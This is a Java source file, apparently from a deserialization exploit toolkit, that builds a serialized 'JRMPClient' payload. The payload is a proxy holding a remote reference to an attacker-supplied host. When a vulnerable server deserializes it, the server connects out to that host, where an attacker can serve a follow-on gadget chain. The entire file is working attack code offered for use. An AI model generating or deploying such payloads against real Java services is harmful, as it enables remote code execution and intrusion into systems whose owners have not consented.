package payloads;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.activation.Activator;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import sun.rmi.transport.tcp.TCPEndpoint;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;

public class JRMPClient {

    @SuppressWarnings("unchecked")
    private static <T extends Remote> T getObject(String host, Class<T> wrapper) {
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, 80);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        T proxy = (T) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{wrapper}, obj);
        return proxy;
    }

    public static byte[] getPayloadBytes(String host, String type) throws Exception {
        final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
        Class<? extends Remote> wrapper;
        if (type.equalsIgnoreCase("activator")) {
            wrapper = Activator.class;
        } else {
            wrapper = Registry.class;
        }
        objOut.writeObject(getObject(host, wrapper));
        objOut.flush();
        objOut.close();
        return byteOut.toByteArray();
    }
}
